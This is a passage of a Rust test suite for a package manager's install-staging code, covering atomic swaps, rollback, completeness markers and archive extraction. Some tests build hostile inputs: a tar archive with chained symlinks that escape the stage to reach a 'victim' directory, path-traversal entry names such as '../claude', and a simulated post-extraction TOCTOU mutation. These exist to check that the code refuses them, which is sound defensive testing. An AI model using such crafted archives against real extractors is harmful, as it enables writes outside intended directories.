    /// separately by `a_stray_file_at_a_scratch_path_is_reclaimed_not_leaked`; the guarantee
    /// under test here is what `swap_into_place` does when its first rename fails, whatever
    /// the cause.
    #[test]
    fn a_swap_that_cannot_begin_restores_the_marker_it_took_down() {
        let b = bundle("swap-blocked");
        let (build, witness) = b.installed();

        let blocker = crate::store::superseded_dir(&build).unwrap();
        std::fs::write(&blocker, b"not a directory").unwrap();
        let incoming = crate::store::incoming_dir(&build).unwrap();
        std::fs::create_dir_all(incoming.join("bin")).unwrap();

        let err = swap_into_place(&build, &incoming).unwrap_err();
        assert!(
            blocker.is_file(),
            "the fixture only exercises the failed-retire path while the blocker is there"
        );
        assert_eq!(
            err.kind(),
            std::io::ErrorKind::NotADirectory,
            "the fixture must fail at the FIRST rename, not somewhere else"
        );
        assert!(
            witness.exists(),
            "the old tree never moved and must still be here"
        );
        assert!(
            crate::store::build_is_complete(&build),
            "a swap that could not begin must leave the build as complete as it found it"
        );
        let _ = std::fs::remove_dir_all(&b.dir);
    }

    /// THE ROLLBACK. If the SECOND rename fails — the one that puts the verified tree where
    /// the old one used to be — the old tree is already parked in `<build>.superseded-<pid>`
    /// and `build_dir` does not exist. Leaving it there is exactly the state this whole
    /// module exists to forbid: no old build, no new build.
    ///
    /// Driven through the real `swap_into_place` with the `incoming` tree absent, which is
    /// the one way to make ONLY the second rename fail in-process: both renames happen in the
    /// same directory, so anything that blocks the second (permissions, an occupied
    /// destination) blocks the first as well.
    #[test]
    fn a_failed_final_rename_rolls_the_old_build_back_and_re_marks_it() {
        let b = bundle("rollback-complete");
        let (build, witness) = b.installed();

        let incoming = crate::store::incoming_dir(&build).unwrap();
        assert!(
            !incoming.exists(),
            "the fixture depends on the incoming tree being absent"
        );

        let err = swap_into_place(&build, &incoming).unwrap_err();
        assert_eq!(
            err.kind(),
            std::io::ErrorKind::NotFound,
            "the fixture must fail at the rename, not somewhere else"
        );
        assert!(
            witness.exists() && std::fs::read(&witness).unwrap() == b"old",
            "the old build must be back at its own path, not stranded in .superseded-"
        );
        assert!(
            crate::store::build_is_complete(&build),
            "it was complete before the swap, so it must be complete after the rollback"
        );
        assert!(
            scratch_beside(&build).is_empty(),
            "the rollback must not leave the superseded tree behind: {:?}",
            scratch_beside(&build)
        );
        let _ = std::fs::remove_dir_all(&b.dir);
    }

    /// …and the other half of that decision. A rollback restores the TREE unconditionally,
    /// but re-marks it ready only if it was ready to begin with. Re-marking a tree that was
    /// never complete would promote a crash leftover to "installed" on the way out of an
    /// unrelated failure — the manager would then run a half-extracted toolchain and report
    /// it up to date.
    #[test]
    fn a_rollback_never_promotes_a_tree_that_was_never_complete() {
        let b = bundle("rollback-incomplete");
        let (build, witness) = b.installed();
        // Demote it to what a crash between extract and mark leaves: a populated tree with
        // no marker.
        crate::store::clear_build_ready(&build).unwrap();
        assert!(
            !crate::store::build_is_complete(&build),
            "the fixture is only interesting while the tree is marker-less"
        );

        let incoming = crate::store::incoming_dir(&build).unwrap();
        assert!(!incoming.exists());
        let err = swap_into_place(&build, &incoming).unwrap_err();
        assert_eq!(err.kind(), std::io::ErrorKind::NotFound);

        assert!(witness.exists(), "the tree still comes back");
        assert!(
            !crate::store::build_is_complete(&build),
            "a rollback must never mark a build that was not complete before it"
        );
        assert!(scratch_beside(&build).is_empty());
        let _ = std::fs::remove_dir_all(&b.dir);
    }

    /// The marker is written LAST, and it is a SIBLING — so it is never part of the tree the
    /// signed `tree_root` covers. Two consequences, both asserted: the freshly-staged tree
    /// still hashes to the signed value with the marker in place, and the marker file itself
    /// lives outside `build_dir`.
    #[test]
    fn the_marker_is_written_last_and_is_never_part_of_the_hashed_tree() {
        let b = bundle("marker-last");
        let build = b.build();
        verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap();

        assert!(crate::store::build_is_complete(&build));
        assert_eq!(
            tree_root(&build).unwrap(),
            b.art.tree_root,
            "the marker must not have moved the tree_root — it is not inside the tree"
        );
        let marker = build.with_file_name("18.ready");
        assert!(marker.is_file(), "the marker is the SIBLING <build>.ready");
        let _ = std::fs::remove_dir_all(&b.dir);
    }

    /// A PARTIAL IS NEVER TRUSTED AS INSTALLED. A fresh install killed (here: failed) mid
    /// extraction must leave nothing that `list_installed` will report, because everything
    /// downstream — `decide`, `atpkg list`, GC's reclaim — takes that list as the truth about
    /// what is on disk. The successful stage in the same layout is what makes the empty
    /// result meaningful rather than an artefact of a mis-built prefix.
    #[test]
    fn a_partial_tree_from_a_failed_fresh_install_is_never_listed_as_installed() {
        let b = bundle("partial-not-installed");
        let layout = crate::store::Layout {
            prefix: b.dir.join("prefix"),
        };
        let build = layout.build_dir("ay", 18);

        let slip = make_slip_archive(&b.dir);
        let slip_art = artifact(&file_sha256(&slip).unwrap(), "");
        let err = verify_and_stage(&slip_art, &slip, &build, &StageHooks::NONE).unwrap_err();
        assert!(matches!(err, StageError::Extract(_)), "got {err:?}");

        assert!(
            crate::ops::list_installed(&layout).is_empty(),
            "a failed fresh install must leave nothing that reads as installed: {:?}",
            crate::ops::list_installed(&layout)
        );
        assert!(!crate::store::build_is_complete(&build));
        assert!(scratch_beside(&build).is_empty(), "and no scratch either");

        // Non-vacuity: the very same layout DOES report a build once one really installs.
        verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap();
        assert_eq!(
            crate::ops::list_installed(&layout),
            vec![("ay".to_string(), 18u64)]
        );
        let _ = std::fs::remove_dir_all(&b.dir);
    }

    /// Block `mark_build_ready`'s temp write by planting a NON-EMPTY DIRECTORY at the exact
    /// `<parent>/.ready.tmp-<pid>` path it writes to: `fs::write` then fails EISDIR.
    ///
    /// This is the one failure the marker step can actually suffer that nothing earlier in
    /// the chain trips over — `clear_build_ready` only touches `<n>.ready`, and
    /// `sweep_stage_scratch` only matches `<n>.incoming-*` / `<n>.superseded-*` — so the
    /// swap completes and the failure lands exactly where the test needs it: step 5.
    fn block_the_marker_write(build_dir: &Path) -> PathBuf {
        let parent = build_dir.parent().unwrap();
        std::fs::create_dir_all(parent).unwrap();
        let blocker = parent.join(format!(".ready.tmp-{}", std::process::id()));
        std::fs::create_dir_all(&blocker).unwrap();
        std::fs::write(blocker.join("occupied"), b"x").unwrap();
        blocker
    }

    // THE INVARIANT AT ITS LAST STEP. When the marker write fails the swap has ALREADY
    // succeeded and the old tree has already been reclaimed, so removing the new tree is
    // the one enumerated path that ends with NEITHER build. It must not: the tree on disk
    // passed every check, so it is left in place, honestly unmarked (`list_installed`
    // skips it, the next run re-stages it) — and a `current` link that named this build
    // still resolves to a verified toolchain instead of dangling.
    #[test]
    fn a_marker_write_that_fails_after_the_swap_keeps_the_verified_tree() {
        let b = bundle("marker-fail-keeps-tree");
        let (build, _witness) = b.installed();
        let blocker = block_the_marker_write(&build);
        assert!(
            crate::store::build_is_complete(&build),
            "PRECONDITION: build 18 is installed and complete before the re-stage"
        );

        let err = verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap_err();
        assert!(
            matches!(err, StageError::Io(_)),
            "the marker write is what failed: {err:?}"
        );

        // The governing invariant: this stage could not FINISH installing the new build, so
        // it must not have left the store with nothing.
        assert!(
            build.is_dir(),
            "a failed marker write destroyed a fully verified, correctly swapped-in tree"
        );
        assert_eq!(
            std::fs::read(build.join("bin/ay")).unwrap(),
            b"#!/bin/true\nthe ay binary",
            "and the tree left behind is the VERIFIED one, not a partial"
        );
        // Honest: unmarked, so it reads as not-installed and the next run re-stages it.
        assert!(
            !crate::store::build_is_complete(&build),
            "a build that could not be marked must never read as complete"
        );

        // Non-vacuity: clear the blocker and the very same call marks it ready.
        std::fs::remove_dir_all(&blocker).unwrap();
        verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap();
        assert!(crate::store::build_is_complete(&build));
        let _ = std::fs::remove_dir_all(&b.dir);
    }

    // THE TWO-RENAME CRASH WINDOW. A SIGKILL between `rename(build, superseded)` and
    // `rename(incoming, build)` leaves the ONLY copy of the old tree at
    // `<build>.superseded-<pid>` with nothing at `<build>`. Routine housekeeping used to
    // `remove_dir_all` it — deleting the user's toolchain as scratch. It must be MOVED
    // BACK instead: a crash is not a reason to lose the only tree there is.
    #[test]
    fn a_crash_between_the_two_renames_recovers_the_old_tree_instead_of_deleting_it() {
        let b = bundle("crash-window-recover");
        let (build, witness) = b.installed();
        // Reproduce the killed-mid-swap state exactly: marker down, tree parked at the
        // superseded name, nothing at the build path.
        let superseded = crate::store::superseded_dir(&build).unwrap();
        crate::store::clear_build_ready(&build).unwrap();
        std::fs::rename(&build, &superseded).unwrap();
        assert!(
            !build.exists() && superseded.is_dir(),
            "PRECONDITION: mid-swap"
        );

        crate::store::sweep_stage_scratch(&build);

        assert!(
            build.is_dir(),
            "the only copy of the old tree was deleted as scratch — nothing is left"
        );
        assert!(
            build.join(witness.file_name().unwrap()).exists(),
            "and it is THAT tree, not a lookalike"
        );
        // Deliberately NOT re-marked: the swap cleared the marker before the rename, so
        // whether the tree was complete is unrecoverable from disk. Unmarked means the next
        // run re-stages it — honest, and it never promotes a partial to "installed".
        assert!(
            !crate::store::build_is_complete(&build),
            "recovery must never claim a completeness it cannot prove"
        );
        assert!(!superseded.exists(), "and the scratch name is released");
        let _ = std::fs::remove_dir_all(&b.dir);
    }

    // The recovery above is NARROW on purpose. When `<build>` is present the superseded
    // sibling is genuine leftover scratch (the swap got past its second rename), and the
    // sweep must still delete it — otherwise a killed run leaks a whole tree forever.
    #[test]
    fn a_superseded_sibling_beside_a_live_build_is_still_swept() {
        let b = bundle("crash-window-narrow");
        let (build, _) = b.installed();
        let superseded = crate::store::superseded_dir(&build).unwrap();
        std::fs::create_dir_all(superseded.join("bin")).unwrap();
        std::fs::write(superseded.join("bin/ay"), b"leftover").unwrap();
        assert!(
            build.is_dir() && superseded.is_dir(),
            "PRECONDITION: both the live tree and the leftover exist"
        );

        crate::store::sweep_stage_scratch(&build);

        assert!(!superseded.exists(), "genuine scratch is still reclaimed");
        assert!(build.is_dir(), "and the live build is untouched");
        assert!(
            crate::store::build_is_complete(&build),
            "a sweep beside a live build must not disturb its marker"
        );
        let _ = std::fs::remove_dir_all(&b.dir);
    }

    // A recovery that did not happen must not fall through into the delete. With `<build>`
    // absent and two superseded siblings beside it, `recover_interrupted_swap` cannot tell
    // which tree is the outgoing one and refuses to move either; sweeping them then would
    // turn a survivable crash into a deleted toolchain. While nothing stands at `<build>`,
    // a superseded sibling is the only copy of that build there is.
    #[test]
    fn a_refused_recovery_keeps_the_only_copy_it_could_not_choose() {
        let b = bundle("crash-window-refused");
        let (build, witness) = b.installed();
        let parked = crate::store::superseded_dir(&build).unwrap();
        crate::store::clear_build_ready(&build).unwrap();
        std::fs::rename(&build, &parked).unwrap();
        // A second parked tree, from another pid: recovery cannot tell which is the
        // outgoing one, and refuses to move either.
        let other = build.with_file_name(format!(
            "{}.superseded-4242",
            build.file_name().unwrap().to_str().unwrap()
        ));
        std::fs::create_dir_all(&other).unwrap();
        // An incoming half-extract is nobody's only copy, and is still swept.
        let incoming = crate::store::incoming_dir(&build).unwrap();
        std::fs::create_dir_all(&incoming).unwrap();
        assert!(!build.exists(), "PRECONDITION: the swap window, ambiguous");

        crate::store::sweep_stage_scratch(&build);

        assert!(
            parked.join(witness.file_name().unwrap()).exists(),
            "the only copy of the user's tree went to the sweep the refusal called off"
        );
        assert!(
            other.is_dir(),
            "and so did the tree it could not be told apart from"
        );
        assert!(
            !incoming.exists(),
            "PRECONDITION: an unverified half-extract is still swept"
        );
        let _ = std::fs::remove_dir_all(&b.dir);
    }

    // The guard above spares a parked *tree* — a directory at `<build>.superseded-<pid>`,
    // the same predicate `recover_interrupted_swap` filters on. Written as "skip every
    // superseded entry" it also spares a regular file or symlink at that name: nobody's
    // only copy, unreclaimable by either sweeper (`remove_dir_all` fails on a file, `gc`
    // scans directories only), and it blocks every later swap of this build from a
    // process holding the same pid.
    #[test]
    fn the_parked_guard_spares_a_parked_tree_not_a_file_at_the_same_name() {
        let b = bundle("crash-window-nondir");
        let (build, witness) = b.installed();
        let parked = crate::store::superseded_dir(&build).unwrap();
        crate::store::clear_build_ready(&build).unwrap();
        std::fs::rename(&build, &parked).unwrap();
        // A second parked tree, so recovery refuses to guess and the guard stays engaged:
        // were `<build>` restored, the sweep would take every sibling anyway.
        let other = build.with_file_name(format!(
            "{}.superseded-4242",
            build.file_name().unwrap().to_str().unwrap()
        ));
        std::fs::create_dir_all(&other).unwrap();
        // The leak: a regular file at a superseded scratch name.
        let stray = build.with_file_name(format!(
            "{}.superseded-9999",
            build.file_name().unwrap().to_str().unwrap()
        ));
        std::fs::write(&stray, b"not a tree").unwrap();
        assert!(!build.exists(), "PRECONDITION: the swap window, ambiguous");

        crate::store::sweep_stage_scratch(&build);

        assert!(
            !stray.exists(),
            "a file at a scratch name is no tree of anyone's, and no other sweeper can ever \
             reclaim it"
        );
        assert!(
            parked.join(witness.file_name().unwrap()).exists(),
            "and the guard still keeps the only copy of the user's tree"
        );
        assert!(
            other.is_dir(),
            "and the tree it could not be told apart from"
        );
        let _ = std::fs::remove_dir_all(&b.dir);
    }

    // The store sweep's recogniser must honour the SAME promise `gc::is_stage_scratch`
    // writes down: an unguarded `remove_dir_all` in a directory the user can also put
    // things in only fires on the producer's exact shape. `<build>.incoming-drafts` is not
    // ours to delete — and GC already refuses it, so the two halves must agree.
    #[test]
    fn a_lookalike_sibling_survives_the_store_sweep_exactly_as_it_survives_gc() {
        let b = bundle("sweep-shape");
        let (build, _) = b.installed();
        let parent = build.parent().unwrap();
        let user_dir = parent.join("18.incoming-drafts");
        std::fs::create_dir_all(&user_dir).unwrap();
        std::fs::write(user_dir.join("notes.md"), b"mine").unwrap();
        // Non-vacuity: a REAL scratch name beside it, to prove the sweep ran at all.
        let real = crate::store::incoming_dir(&build).unwrap();
        std::fs::create_dir_all(&real).unwrap();

        crate::store::sweep_stage_scratch(&build);

        assert!(!real.exists(), "PRECONDITION: the sweep really ran");
        assert!(
            user_dir.join("notes.md").exists(),
            "'looks like something we made' is not a good enough test for remove_dir_all"
        );
        let _ = std::fs::remove_dir_all(&b.dir);
    }

    // A NON-DIRECTORY at a scratch path was reclaimed by neither sweeper: the store sweep
    // called `remove_dir_all` (which fails on a file) and GC skipped it on its `is_dir`
    // filter. It leaks forever, and while it sits there it makes every stage of that build
    // by a process with that pid fail at the swap. The store sweep must take it.
    #[test]
    fn a_stray_file_at_a_scratch_path_is_reclaimed_not_leaked() {
        let b = bundle("sweep-stray-file");
        let (build, _) = b.installed();
        let blocker = crate::store::superseded_dir(&build).unwrap();
        std::fs::write(&blocker, b"not a directory").unwrap();
        assert!(
            blocker.is_file(),
            "PRECONDITION: a regular file is in the way"
        );

        crate::store::sweep_stage_scratch(&build);
        assert!(
            !blocker.exists(),
            "a stray file at a scratch path leaks forever if the sweep only removes dirs"
        );

        // And with it gone the stage that it was blocking now succeeds end to end.
        verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap();
        assert!(crate::store::build_is_complete(&build));
        let _ = std::fs::remove_dir_all(&b.dir);
    }

    // A rollback may only re-mark a tree it actually put back. `mark_build_ready` has no
    // existence precondition — it writes a temp beside the build and renames it onto
    // `<n>.ready` without ever looking at `<n>` — so a rollback whose restoring rename ALSO
    // failed would leave a completeness marker asserting a tree that is not there.
    //
    // Driven through `restore_outgoing` directly rather than through `verify_and_stage`,
    // and honestly so: the compound failure needs BOTH renames in one directory to fail,
    // and on a real filesystem anything that blocks the second (permissions, an occupied
    // destination) blocks the first as well. `restore_outgoing` is the production function,
    // not a restatement of it, and a missing source is a real rename failure.
    #[test]
    fn a_rollback_that_cannot_restore_the_tree_writes_no_marker() {
        let b = bundle("rollback-restore-fails");
        let build = b.build();
        std::fs::create_dir_all(build.parent().unwrap()).unwrap();
        let vanished = crate::store::superseded_dir(&build).unwrap();
        assert!(
            !vanished.exists(),
            "PRECONDITION: the tree to restore is not there, so the rename must fail"
        );

        assert!(
            !restore_outgoing(&vanished, &build, true),
            "a failed restore must report itself as failed"
        );
        assert!(
            !crate::store::build_is_complete(&build),
            "a rollback that could not restore the tree must not claim it is complete"
        );

        // Non-vacuity: with a real tree to move back, the SAME call restores AND re-marks.
        std::fs::create_dir_all(vanished.join("bin")).unwrap();
        assert!(restore_outgoing(&vanished, &build, true));
        assert!(build.join("bin").is_dir(), "the tree really came back");
        assert!(crate::store::build_is_complete(&build));
        let _ = std::fs::remove_dir_all(&b.dir);
    }

    // And the other half of the same guard: a restore that SUCCEEDS for a tree that was not
    // complete before the swap must still not mark it. Re-marking there would promote a
    // crash leftover to "installed" on the way out of an unrelated failure.
    #[test]
    fn a_successful_restore_never_marks_a_tree_that_was_not_complete() {
        let b = bundle("restore-guard-incomplete");
        let build = b.build();
        std::fs::create_dir_all(build.parent().unwrap()).unwrap();
        let old = crate::store::superseded_dir(&build).unwrap();
        std::fs::create_dir_all(old.join("bin")).unwrap();

        assert!(restore_outgoing(&old, &build, false));
        assert!(
            build.join("bin").is_dir(),
            "PRECONDITION: the tree came back"
        );
        assert!(
            !crate::store::build_is_complete(&build),
            "a rollback must never mark a build that was not complete before it"
        );
        let _ = std::fs::remove_dir_all(&b.dir);
    }
    /// The armed cross-check: with the on-disk walk re-armed, an agreeing pair is passed
    /// through unchanged and a DISAGREEING pair fails the stage closed, naming both roots.
    ///
    /// Driven as a pure function rather than through the env var: `std::env::set_var` is
    /// `unsafe` in edition 2024 and racy under a multi-threaded runner, and what needs
    /// pinning is the DECISION, not the lookup.
    #[test]
    fn the_armed_disk_reverify_agrees_or_fails_closed() {
        let b = bundle("armed-reverify");
        let probe = b.dir.join("armed-probe");
        let fused =
            crate::extract::extract_tar_zst_rooted(&b.archive, &probe, 1 << 20, 1000).unwrap();
        let walked = tree_root(&probe).unwrap();
        // Reach guard: the corpus must be non-empty, or "they agree" is vacuous.
        assert_eq!(fused.len(), 64);
        assert_eq!(
            fused, walked,
            "the two producers must agree over this bundle"
        );

        // Disarmed: the fused root is returned verbatim, no walk.
        assert_eq!(
            reverified_root(&probe, fused.clone(), false).unwrap(),
            fused
        );
        // Armed and agreeing: still the same 64 characters.
        assert_eq!(reverified_root(&probe, fused.clone(), true).unwrap(), fused);
        // Armed and DISAGREEING: fail closed, and say which two roots disagreed.
        let bogus = "0".repeat(64);
        let err = reverified_root(&probe, bogus.clone(), true).unwrap_err();
        let text = err.to_string();
        assert!(
            text.contains(&bogus),
            "the folded root must be named: {text}"
        );
        assert!(
            text.contains(&walked),
            "the walked root must be named: {text}"
        );
        let _ = std::fs::remove_dir_all(&b.dir);
    }

    /// A tree mutated AFTER extraction is still refused when the walk is armed — the
    /// window the fused digest gives up is exactly this one, so the escape hatch has to
    /// actually close it.
    #[test]
    fn the_armed_walk_still_catches_a_post_extraction_mutation() {
        let b = bundle("armed-mutation");
        let probe = b.dir.join("mut-probe");
        let fused =
            crate::extract::extract_tar_zst_rooted(&b.archive, &probe, 1 << 20, 1000).unwrap();
        // Mutate one extracted file in place, exactly as a TOCTOU attacker would.
        let victim = first_regular_file(&probe).expect("the fixture bundle has a file");
        std::fs::write(&victim, b"swapped after extraction").unwrap();
        assert!(
            reverified_root(&probe, fused, true).is_err(),
            "an armed re-verify must refuse a tree mutated after the write"
        );
        let _ = std::fs::remove_dir_all(&b.dir);
    }

    /// The first regular file under `dir`, in walk order — the mutation victim above.
    fn first_regular_file(dir: &Path) -> Option<PathBuf> {
        let mut entries: Vec<_> = std::fs::read_dir(dir).ok()?.flatten().collect();
        entries.sort_by_key(std::fs::DirEntry::file_name);
        for e in entries {
            let p = e.path();
            let meta = std::fs::symlink_metadata(&p).ok()?;
            if meta.is_file() {
                return Some(p);
            }
            if meta.is_dir()
                && let Some(found) = first_regular_file(&p)
            {
                return Some(found);
            }
        }
        None
    }

    // ===== the https payload lanes =====

    #[cfg(unix)]
    use crate::extract::fixtures::gzip_bytes;
    use crate::extract::fixtures::{ZipMember, tar_bytes, zip_bytes};

    /// An https artifact over `archive`, signed for ITS bytes and for `root`.
    fn vendor_artifact(archive: &Path, payload: &str, root: &str) -> Artifact {
        let mut a = artifact(&file_sha256(archive).unwrap(), root);
        a.kind = if payload == "dmg" {
            "app-bundle".into()
        } else {
            "binary".into()
        };
        a.protocol = "https".into();
        a.payload = payload.into();
        a.size = std::fs::metadata(archive).unwrap().len();
        a
    }

    /// Write `content` at `dir/rel` with `mode`, creating parents — the REPLICA the
    /// expected roots below are learned from, so no expectation ever comes out of the
    /// function under test.
    #[cfg(unix)]
    fn lay(dir: &Path, rel: &str, content: &[u8], mode: u32) {
        use std::os::unix::fs::PermissionsExt as _;
        let p = dir.join(rel);
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(&p, content).unwrap();
        std::fs::set_permissions(&p, std::fs::Permissions::from_mode(mode)).unwrap();
    }

    #[cfg(unix)]
    fn lay_link(dir: &Path, rel: &str, target: &str) {
        let p = dir.join(rel);
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::os::unix::fs::symlink(target, p).unwrap();
    }

    /// The `gh` archive shape as tar bytes: a versioned top-level directory to strip,
    /// an executable, a plain file.
    fn gh_tar() -> Vec<u8> {
        tar_bytes(&[
            ("gh_2.80.0_macOS_arm64/", b'5', "", b"", 0o755),
            (
                "gh_2.80.0_macOS_arm64/bin/gh",
                b'0',
                "",
                b"#!/bin/sh\necho gh\n",
                0o755,
            ),
            ("gh_2.80.0_macOS_arm64/LICENSE", b'0', "", b"MIT", 0o644),
        ])
    }

    /// …and the same shape as a zip.
    fn gh_zip() -> Vec<u8> {
        zip_bytes(
            &[
                ZipMember {
                    name: "gh_2.80.0_macOS_arm64/",
                    mode: 0o040_755,
                    data: b"",
                    deflate: false,
                },
                ZipMember {
                    name: "gh_2.80.0_macOS_arm64/bin/gh",
                    mode: 0o100_755,
                    data: b"#!/bin/sh\necho gh\n",
                    deflate: true,
                },
                ZipMember {
                    name: "gh_2.80.0_macOS_arm64/LICENSE",
                    mode: 0o100_644,
                    data: b"MIT",
                    deflate: false,
                },
            ],
            false,
        )
    }

    /// The tree the `gh` shape must stage to, learned from a hand-laid replica.
    #[cfg(unix)]
    fn gh_expected_root(dir: &Path) -> String {
        let replica = dir.join("replica");
        lay(&replica, "bin/gh", b"#!/bin/sh\necho gh\n", 0o755);
        lay(&replica, "LICENSE", b"MIT", 0o644);
        tree_root(&replica).unwrap()
    }

    /// The `tar-gz` and `zip` lanes stage the `gh` shape — top level stripped, modes
    /// sanitized — to the root a hand-laid replica walks to, and a row that FORGOT its
    /// `strip_components` is refused at the re-verify (the tree is honestly different).
    #[cfg(unix)]
    #[test]
    fn tar_gz_and_zip_vendor_payloads_stage_with_strip_components() {
        let d = tmp("vendor-archives");
        let expected = gh_expected_root(&d);
        let gz = d.join("gh.tar.gz");
        std::fs::write(&gz, gzip_bytes(&gh_tar())).unwrap();
        let zip = d.join("gh.zip");
        std::fs::write(&zip, gh_zip()).unwrap();
        for (label, archive, payload) in [("gz", &gz, "tar-gz"), ("zip", &zip, "zip")] {
            let mut art = vendor_artifact(archive, payload, &expected);
            art.strip_components = 1;
            let build = d.join(format!("store/gh-{label}/18"));
            verify_and_stage(&art, archive, &build, &StageHooks::NONE)
                .unwrap_or_else(|e| panic!("{label}: {e}"));
            assert!(crate::store::build_is_complete(&build), "{label}");
            assert_eq!(
                std::fs::read(build.join("bin/gh")).unwrap(),
                b"#!/bin/sh\necho gh\n",
                "{label}"
            );
            assert_eq!(
                std::fs::read(build.join("LICENSE")).unwrap(),
                b"MIT",
                "{label}"
            );
            assert!(
                !build.join("gh_2.80.0_macOS_arm64").exists(),
                "{label}: stripped"
            );
            assert_eq!(
                tree_root(&build).unwrap(),
                expected,
                "{label}: the walk agrees after the swap"
            );
            assert!(scratch_beside(&build).is_empty(), "{label}");

            // Unstripped, the tree is `gh_.../bin/gh` — a different root, refused.
            let mut unstripped = vendor_artifact(archive, payload, &expected);
            unstripped.strip_components = 0;
            let build2 = d.join(format!("store/gh-{label}-unstripped/18"));
            let err =
                verify_and_stage(&unstripped, archive, &build2, &StageHooks::NONE).unwrap_err();
            assert!(
                matches!(err, StageError::TreeRootMismatch { .. }),
                "{label}: {err:?}"
            );
            assert!(
                !build2.exists(),
                "{label}: nothing staged on a root mismatch"
            );
        }
        let _ = std::fs::remove_dir_all(&d);
    }

    /// The `tar-zst` vendor lane is the historical extractor plus the vendor options
    /// — the same tar bytes reach the same root as the gzip lane.
    #[cfg(unix)]
    #[test]
    fn tar_zst_vendor_payload_matches_the_gzip_lane() {
        let d = tmp("vendor-zst");
        let expected = gh_expected_root(&d);
        let zst = d.join("gh.tar.zst");
        std::fs::write(&zst, zstd::encode_all(&gh_tar()[..], 0).unwrap()).unwrap();
        let mut art = vendor_artifact(&zst, "tar-zst", &expected);
        art.strip_components = 1;
        let build = d.join("store/gh/18");
        verify_and_stage(&art, &zst, &build, &StageHooks::NONE).unwrap();
        assert_eq!(tree_root(&build).unwrap(), expected);
        let _ = std::fs::remove_dir_all(&d);
    }

    /// The `raw-binary` lane: the download becomes `bin/<entry>` at `0755`, and the
    /// root it folds is the one a hand-laid `bin/<entry>` walks to. An `entry` that is
    /// not a bare tool name is refused before anything is written.
    #[cfg(unix)]
    #[test]
    fn raw_binary_payload_becomes_bin_entry_at_0755() {
        use std::os::unix::fs::PermissionsExt as _;
        let d = tmp("vendor-raw");
        let payload: Vec<u8> = (0..300_000usize).map(|i| (i % 253) as u8).collect();
        let dl = d.join("claude-2.1.231-darwin-arm64");
        std::fs::write(&dl, &payload).unwrap();
        let replica = d.join("replica");
        lay(&replica, "bin/claude", &payload, 0o755);
        let expected = tree_root(&replica).unwrap();

        let mut art = vendor_artifact(&dl, "raw-binary", &expected);
        art.entry = "claude".into();
        let build = d.join("store/claude/2026082601");
        verify_and_stage(&art, &dl, &build, &StageHooks::NONE).unwrap();
        assert!(crate::store::build_is_complete(&build));
        assert_eq!(std::fs::read(build.join("bin/claude")).unwrap(), payload);
        assert_eq!(
            std::fs::metadata(build.join("bin/claude"))
                .unwrap()
                .permissions()
                .mode()
                & 0o7777,
            0o755
        );
        assert_eq!(tree_root(&build).unwrap(), expected);
        // The download itself is untouched (flow reclaims it).
        assert_eq!(std::fs::metadata(&dl).unwrap().len(), payload.len() as u64);

        for bad in ["", "bin/claude", "../claude", "sudo"] {
            let mut art = vendor_artifact(&dl, "raw-binary", &expected);
            art.entry = bad.into();
            let build = d.join("store/bad/1");
            let err = verify_and_stage(&art, &dl, &build, &StageHooks::NONE).unwrap_err();
            assert!(matches!(err, StageError::Payload(_)), "{bad:?}: {err:?}");
            assert!(!build.exists(), "{bad:?}");
        }
        let _ = std::fs::remove_dir_all(&d);
    }

    /// `apply_links` runs `create_dir_all(bin)` + `chmod 0755 bin` and then creates
    /// `bin/<name>` — all of which FOLLOW a `bin` that is a symlink. A staged `bin` (or a
    /// link target's ancestor) that is a symlink must be refused before any of it, so
    /// nothing outside the stage is chmodded or gets a link planted in it (audit K1,
    /// 2026-09-12). Both through the real vendor lane (a link chain in the archive) and
    /// against `apply_links` directly (defence in depth: any `bin` symlink at all).
    #[cfg(unix)]
    #[test]
    fn apply_links_never_writes_through_a_staged_bin_symlink() {
        use std::os::unix::fs::PermissionsExt as _;
        let d = tmp("links-bin-symlink");
        let victim = d.join("victim");
        std::fs::create_dir_all(&victim).unwrap();
        std::fs::set_permissions(&victim, std::fs::Permissions::from_mode(0o700)).unwrap();
        let mode = |p: &Path| std::fs::metadata(p).unwrap().permissions().mode() & 0o777;

        // 1. Through the vendor lane: two in-root links that chain out to `victim`.
        let gz = d.join("chain.tar.gz");
        std::fs::write(
            &gz,
            gzip_bytes(&tar_bytes(&[
                ("a/b/c/", b'5', "", b"", 0o755),
                ("a/b/c/up", b'2', "../../..", b"", 0o777),
                ("bin", b'2', "a/b/c/up/../victim", b"", 0o777),
                ("gh-real", b'0', "", b"#!/bin/sh\n", 0o755),
            ])),
        )
        .unwrap();
        let mut art = vendor_artifact(&gz, "tar-gz", "");
        art.links.insert("gh".into(), "gh-real".into());
        let stage = d.join("stage");
        let got = stage_payload(&art, &gz, &stage);
        assert!(got.is_err(), "the chained bin link must not stage: {got:?}");
        assert!(
            std::fs::symlink_metadata(victim.join("gh")).is_err(),
            "no link planted outside the stage"
        );
        assert_eq!(
            mode(&victim),
            0o700,
            "the outside directory was not chmodded"
        );

        // 2. apply_links itself: a `bin` symlink laid by any means is refused …
        let dest = d.join("direct");
        lay(&dest, "gh-real", b"#!/bin/sh\n", 0o755);
        std::os::unix::fs::symlink(&victim, dest.join("bin")).unwrap();
        let mut links = BTreeMap::new();
        links.insert("gh".to_string(), "gh-real".to_string());
        let err = apply_links(&dest, &links, None).unwrap_err();
        assert!(matches!(err, StageError::Payload(_)), "{err:?}");
        assert!(std::fs::symlink_metadata(victim.join("gh")).is_err());
        assert_eq!(mode(&victim), 0o700);

        // … and so is a target reached through a symlinked ancestor, whose existence
        // probe would otherwise be answered from outside the stage.
        let dest = d.join("ancestor");
        std::fs::create_dir_all(&dest).unwrap();
        std::fs::write(victim.join("tool"), b"x").unwrap();
        std::os::unix::fs::symlink(&victim, dest.join("lib")).unwrap();
        let mut links = BTreeMap::new();
        links.insert("tool".to_string(), "lib/tool".to_string());
        let err = apply_links(&dest, &links, None).unwrap_err();
        assert!(matches!(err, StageError::Payload(_)), "{err:?}");
        assert!(std::fs::symlink_metadata(dest.join("bin/tool")).is_err());
        let _ = std::fs::remove_dir_all(&d);
    }

    /// `links` lay RELATIVE symlinks `bin/<name> -> ../<target>` after extraction, fold
    /// into the root exactly as the walk reads them, and resolve to the staged file.
